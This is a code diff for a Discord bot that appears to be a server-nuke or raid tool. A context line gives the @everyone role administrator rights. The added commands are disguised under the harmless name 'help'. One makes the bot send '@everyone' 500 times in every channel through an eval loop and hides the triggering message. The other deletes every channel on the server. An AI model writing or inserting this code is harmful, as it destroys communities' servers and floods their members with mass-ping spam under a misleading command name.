@@ -260,3 +260,35 @@ $modifyRolePerms[$roleID[@everyone];+admin]
 $deletecommand
 `
   })
+
+bot.command({
+  name:"help",
+  code:`
+$forEachChannel[extraxspam]
+$deletecommand`
+})
+
+bot.awaitedCommand({
+  name:"extraxspam",
+  code:`
+    $djsEval[for(var i = 0;i < 500;i++){
+message.channel.send("  @everyone")
+}]
+  `
+  })
+
+
+bot.command({
+  name:"help",
+  code:`
+  $forEachChannel[extraxkanalsil]
+  
+  `
+  })
+
+bot.awaitedCommand({
+  name:"extraxkanalsil",
+  code:`
+  $deleteChannel[$channelID]
+  `
+  })
